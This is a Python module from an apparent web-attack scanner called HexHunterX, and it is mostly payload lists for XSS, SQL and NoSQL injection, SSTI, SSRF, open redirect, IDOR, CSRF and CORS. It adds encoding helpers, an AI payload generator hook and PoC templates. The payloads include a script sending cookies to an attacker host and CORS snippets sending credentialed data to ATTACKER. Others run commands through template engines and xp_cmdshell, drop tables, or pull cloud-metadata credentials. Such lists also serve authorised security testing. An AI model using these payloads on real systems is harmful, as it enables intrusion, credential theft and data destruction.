"""
HexHunterX -- Payload Injection Engine.

Context-aware payload generation with encoding support.
Curated from community sources including OWASP, PayloadBox, and PayloadPlayground.
"""

import base64
from urllib.parse import quote
from utils.logger import HexHunterXLogger
# AI-ENHANCED
from ai.payloads import generate_payloads

logger = HexHunterXLogger.get_logger("fuzzing.payloads")


# --- Payload Databases -----------------------------------------------

XSS_PAYLOADS = [
    # --- Basic / Reflected ---
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '" onmouseover="alert(1)" x="',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    # --- Event-Based ---
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video><source onerror="alert(1)">',
    '<form><button formaction="javascript:alert(1)">X</button>',
    # --- Attribute Breakout ---
    "\" onmouseover=\"alert(1)\"",
    "' onmouseover='alert(1)'",
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    # --- Filter Bypass ---
    '<ScRiPt>alert(1)</sCriPt>',
    '<IMG SRC=JaVaScRiPt:alert(1)>',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    '<img/src=`x`onerror=alert(1)>',
    '<svg/onload=confirm(1)>',
    '<script>alert`1`</script>',
    # --- HTML Entity / Encoding ---
    '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;'
    '&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74'
    '&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    # --- DOM-Based Probes ---
    '<script>document.write("<img src=x onerror=alert(1)>")</script>',
    '"><script>document.location="https://evil.HexHunterX.test/"+document.cookie</script>',
    # --- Polyglot ---
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"
    '";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//'
    "-->\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    # --- Data URI / Base64 ---
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>',
    # --- Template Injection Probes ---
    '{{7*7}}',
    '{{constructor.constructor("return this")()}}',
]

SQLI_PAYLOADS = [
    # --- Generic / Auth Bypass ---
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "1' AND '1'='1",
    "admin' --",
    "admin' #",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    '" OR "1"="1"--',
    "' OR ''='",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "') or ('1'='1",
    "') or ('1'='1'--",
    # --- UNION-Based ---
    "1 UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' AND 1=2 UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT @@VERSION,NULL--",
    "' UNION SELECT username,password FROM users--",
    "-1 UNION SELECT 1,2,3--",
    # --- Error-Based ---
    "' AND 1=CONVERT(int,@@version)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "' AND (SELECT count(*) FROM users) > 1--",
    # --- Time-Based Blind ---
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "' OR SLEEP(5)#",
    "'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(10000000,MD5(1))--",
    "' OR pg_sleep(5)--",
    "1)) or sleep(5)#",
    # --- Boolean Blind ---
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    # --- WAF Bypass ---
    "' OR 1=1/*",
    "' /*!50000OR*/ 1=1--",
    "'/**/OR/**/1=1--",
    "' OR 1=1-- -",
    "uNiOn SeLeCt NULL--",
    "UNI/**/ON SELECT NULL--",
    # --- Stacked Queries ---
    "'; DROP TABLE users;--",
    "1; SELECT * FROM information_schema.tables--",
    # --- DB-Specific (MySQL) ---
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # --- DB-Specific (MSSQL) ---
    "'; EXEC xp_cmdshell('whoami');--",
    # --- DB-Specific (PostgreSQL) ---
    "'; SELECT pg_sleep(5);--",
    # --- DB-Specific (SQLite) ---
    "' AND 1=1 UNION SELECT sql FROM sqlite_master--",
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com/path",
    "//evil.com/%2f%2e%2e",
    "/%09/evil.com",
    "///evil.com",
    "\\\\evil.com",
    "https:evil.com",
    "//127.0.0.1",
    "//0x7f.0x0.0x0.0x1",
    "//localhost",
    "//[::1]",
    "//evil.com@victim.com",
    "https://evil.com@victim.com",
    "//victim.com@evil.com",
    "https://victim.com@evil.com",
    "?url=//evil.com",
    "?redirect=https://evil.com",
    "?next=//evil.com",
    "?return=https://evil.com",
    "?returnTo=//evil.com",
    # --- Additional Bypass ---
    "https://evil.com%00@victim.com",
    "https://evil.com%0d%0a@victim.com",
    "/\\/evil.com",
    "/.evil.com",
    "https://evil.com#@victim.com",
    "https://evil.com?@victim.com",
]

IDOR_PAYLOADS = [
    # --- Sequential ID ---
    "1", "2", "100", "999", "0", "-1",
    "9999999", "1000", "1001",
    # --- UUID ---
    "00000000-0000-0000-0000-000000000000",
    # --- Special Values ---
    "admin", "self", "me", "current",
    "null", "undefined", "NaN",
    # --- Encoded ---
    "MQ==",  # base64("1")
    "Mg==",  # base64("2")
    # --- HTTP Parameter Pollution ---
    "1&user_id=2",
    "1&id=2",
    # --- Path Traversal ID ---
    "../1",
    "..%2f1",
    # --- Array Injection ---
    "1[]",
    "1,2",
]

SSTI_PAYLOADS = [
    # --- Detection / Polyglot ---
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{7*'7'}}",
    "*{7*7}",
    "#set($x=7*7)$x",
    # --- Jinja2 / Flask (Python) ---
    "{{config}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__.os.popen('id').read()}}",
    "{{self.__class__}}",
    "{{dump(app)}}",
    # --- Twig (PHP) ---
    "{{['id']|filter('system')}}",
    "{{['id']|map('system')}}",
    "{{'id'|filter('system')}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # --- FreeMarker / Java ---
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    '${T(java.lang.Runtime).getRuntime().exec("id")}',
    '${T(java.lang.Runtime)}',
    '${product.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}',
    # --- Velocity (Java) ---
    '#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))',
    # --- ERB / Ruby ---
    "<%= `id` %>",
    '<%= system("id") %>',
    '<%= IO.popen("id").read %>',
    '<%= File.read("/etc/passwd") %>',
    '<%= Dir.entries("/") %>',
]

SSRF_PAYLOADS = [
    # --- Cloud Metadata (AWS) ---
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/api/token",
    # --- Cloud Metadata (GCP) ---
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # --- Cloud Metadata (Azure) ---
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # --- Cloud Metadata (Alibaba / OpenStack) ---
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.169.254/openstack/latest/meta_data.json",
    # --- Localhost IP Bypass ---
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://0",
    "http://2130706433",       # Decimal 127.0.0.1
    "http://0x7f000001",       # Hex 127.0.0.1
    "http://0177.0.0.1",       # Octal
    "http://[::1]",            # IPv6 localhost
    "http://[::ffff:127.0.0.1]",
    "http://127.1",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    # --- URL Parsing Tricks ---
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
    "http://127.0.0.1%00@evil.com",
    "http://127.0.0.1?@evil.com",
    "http://evil.com\\@127.0.0.1",
    # --- Protocol Smuggling ---
    "file:///etc/passwd",
    "file:///proc/self/environ",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    # --- Internal Service Scan ---
    "http://127.0.0.1:22",     # SSH
    "http://127.0.0.1:6379",   # Redis
    "http://127.0.0.1:11211",  # Memcached
    "http://127.0.0.1:27017",  # MongoDB
    "http://127.0.0.1:9200",   # Elasticsearch
    "http://127.0.0.1:3306",   # MySQL
    "http://127.0.0.1:5432",   # PostgreSQL
    "http://127.0.0.1:8080",   # Alt HTTP
    "http://127.0.0.1:2375",   # Docker API
]

NOSQLI_PAYLOADS = [
    # --- MongoDB Auth Bypass ---
    '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
    'username[$ne]=&password[$ne]=',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    'username[$regex]=.*&password[$regex]=.*',
    '{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}',
    '{"username": "admin", "password": {"$exists": true}}',
    # --- Operator Injection ---
    '{"$where": "this.username == \'admin\'"}',
    '{"$where": "function() { return true; }"}',
    '{"username": {"$regex": "^adm"}}',
    '{"$or": [{"username": "admin"}, {"username": "root"}]}',
    '{"price": {"$gt": 0, "$lt": 1}}',
    # --- Blind Extraction ---
    'username=admin&password[$regex]=^a',
    'username=admin&password[$regex]=^ab',
    '{"username": "admin", "password": {"$regex": "^.{8}$"}}',
    '{"username": {"$regex": "^.{0,5}$"}}',
    # --- URL Parameter Form ---
    'username[$gt]=&password[$gt]=',
    'username[$exists]=true&password[$exists]=true',
    'search[$regex]=.*',
]

CSRF_PAYLOADS = [
    # --- Auto-Submit Form (HTML PoC) ---
    '<form action="TARGET/change-email" method="POST">'
    '<input type="hidden" name="email" value="attacker@evil.com"/>'
    '</form><script>document.forms[0].submit();</script>',
    # --- GET-based CSRF ---
    '<img src="TARGET/delete?id=1" style="display:none">',
    '<iframe src="TARGET/action?param=value" style="display:none"></iframe>',
    # --- Fetch API CSRF ---
    '<script>fetch("TARGET/api/action",{method:"POST",credentials:"include",'
    'headers:{"Content-Type":"application/x-www-form-urlencoded"},'
    'body:"password=hacked"})</script>',
    # --- JSON CSRF ---
    '<script>fetch("TARGET/api/action",{method:"POST",credentials:"include",'
    'headers:{"Content-Type":"application/json"},'
    'body:JSON.stringify({key:"value"})})</script>',
    # --- Token Bypass Techniques (descriptions) ---
    "Remove CSRF token parameter entirely",
    "Use empty string as CSRF token value",
    "Change POST to GET and move params to query string",
    "Change Content-Type to text/plain",
    "Change Content-Type to multipart/form-data",
]

CORS_PAYLOADS = [
    # --- Origin Headers to Test ---
    "https://evil.HexHunterX.test",
    "null",
    "https://trusted.com.evil.HexHunterX.test",
    "https://eviltrusted.com",
    "https://trusted.com%60.evil.HexHunterX.test",
    "https://trusted.com%00.evil.HexHunterX.test",
    # --- Exploitation PoC JS snippets ---
    'fetch("TARGET/api/sensitive",{credentials:"include"})'
    '.then(r=>r.text()).then(d=>fetch("https://ATTACKER/log?d="+btoa(d)))',
    # --- Null Origin via iframe ---
    '<iframe sandbox="allow-scripts" srcdoc="<script>'
    "fetch('TARGET/api/sensitive',{credentials:'include'})"
    ".then(r=>r.text()).then(d=>fetch('https://ATTACKER/log?d='+btoa(d)))"
    '</script>"></iframe>',
]


class PayloadEngine:
    """
    Context-aware payload generation and encoding engine.

    Features:
        - Category-based payload selection (10 categories)
        - Multiple encoding schemes (URL, double-URL, base64, HTML)
        - Custom payload generation
        - PoC generation for confirmed vulnerabilities
    """

    PAYLOADS = {
        "xss": XSS_PAYLOADS,
        "sqli": SQLI_PAYLOADS,
        "redirect": REDIRECT_PAYLOADS,
        "idor": IDOR_PAYLOADS,
        "ssti": SSTI_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
        "nosqli": NOSQLI_PAYLOADS,
        "csrf": CSRF_PAYLOADS,
        "cors": CORS_PAYLOADS,
    }

    @classmethod
    def get_payloads(cls, category: str, encoded: bool = False) -> list[str]:
        """
        Get payloads for a vulnerability category.

        Args:
            category: Vulnerability type (xss, sqli, redirect, idor, ssti, ssrf, nosqli, csrf, cors)
            encoded: If True, return URL-encoded versions alongside originals

        Returns:
            List of payload strings
        """
        payloads = cls.PAYLOADS.get(category, [])
        if encoded:
            expanded = []
            for p in payloads:
                expanded.append(p)
                expanded.append(cls.url_encode(p))
                expanded.append(cls.double_url_encode(p))
            return expanded
        return payloads

    @classmethod
    async def get_payloads_ai(cls, category: str, tech_stack: list[str] = None, waf_name: str = "", encoded: bool = False) -> list[str]:
        """
        # AI-ENHANCED
        Get payloads including AI-generated context-aware payloads.
        """
        payloads = cls.PAYLOADS.get(category, []).copy()
        
        # Prepend AI payloads if we have context
        if tech_stack or waf_name:
            ai_payloads = await generate_payloads(category, tech_stack or [], waf_name)
            if ai_payloads:
                logger.info(f"Loaded {len(ai_payloads)} AI payloads for {category}")
                payloads = ai_payloads + payloads

        if encoded:
            expanded = []
            for p in payloads:
                expanded.append(p)
                expanded.append(cls.url_encode(p))
                expanded.append(cls.double_url_encode(p))
            return expanded
        return payloads

    @classmethod
    def get_categories(cls) -> list[str]:
        """Return all available payload categories."""
        return list(cls.PAYLOADS.keys())

    @classmethod
    def get_payload_count(cls) -> dict[str, int]:
        """Return payload counts per category."""
        return {k: len(v) for k, v in cls.PAYLOADS.items()}

    @staticmethod
    def url_encode(payload: str) -> str:
        return quote(payload, safe="")

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return quote(quote(payload, safe=""), safe="")

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def html_encode(payload: str) -> str:
        return payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

    @classmethod
    def generate_poc(cls, vuln_type: str, url: str, param: str, payload: str) -> str:
        """
        Generate a Proof-of-Concept description for a finding.

        Returns a formatted PoC string with reproduction steps.
        """
        poc_templates = {
            "xss": (
                f"## XSS Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Parameter:** `{param}`\n"
                f"**Payload:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Navigate to: `{url}?{param}={quote(payload, safe='')}`\n"
                f"2. Observe the payload execution in the browser\n"
                f"3. Check the DOM for reflected content\n"
            ),
            "sqli": (
                f"## SQL Injection Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Parameter:** `{param}`\n"
                f"**Payload:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Send request to: `{url}?{param}={quote(payload, safe='')}`\n"
                f"2. Observe database error in response\n"
                f"3. Confirm with time-based payload for verification\n"
            ),
            "redirect": (
                f"## Open Redirect Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Parameter:** `{param}`\n"
                f"**Payload:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Navigate to: `{url}?{param}={quote(payload, safe='')}`\n"
                f"2. Observe redirect to external domain\n"
            ),
            "ssti": (
                f"## SSTI Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Parameter:** `{param}`\n"
                f"**Payload:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Inject payload into: `{url}?{param}={quote(payload, safe='')}`\n"
                f"2. Check response for computed value (e.g., 49 for {{{{7*7}}}})\n"
                f"3. Escalate to RCE with engine-specific payload\n"
            ),
            "ssrf": (
                f"## SSRF Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Parameter:** `{param}`\n"
                f"**Payload:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Inject payload into: `{url}?{param}={quote(payload, safe='')}`\n"
                f"2. Check if internal service or cloud metadata is accessible\n"
                f"3. Monitor response for internal data disclosure\n"
            ),
            "nosqli": (
                f"## NoSQL Injection Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Parameter:** `{param}`\n"
                f"**Payload:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Send JSON body with operator injection to: `{url}`\n"
                f"2. Check if authentication is bypassed\n"
                f"3. Attempt blind extraction with $regex operator\n"
            ),
            "cors": (
                f"## CORS Misconfiguration Proof of Concept\n\n"
                f"**URL:** `{url}`\n"
                f"**Origin Tested:** `{payload}`\n\n"
                f"### Reproduction Steps\n"
                f"1. Send request with `Origin: {payload}` header\n"
                f"2. Check `Access-Control-Allow-Origin` in response\n"
                f"3. Verify if `Access-Control-Allow-Credentials: true` is present\n"
            ),
        }
        return poc_templates.get(vuln_type, f"PoC for {vuln_type} at {url} with param {param}")
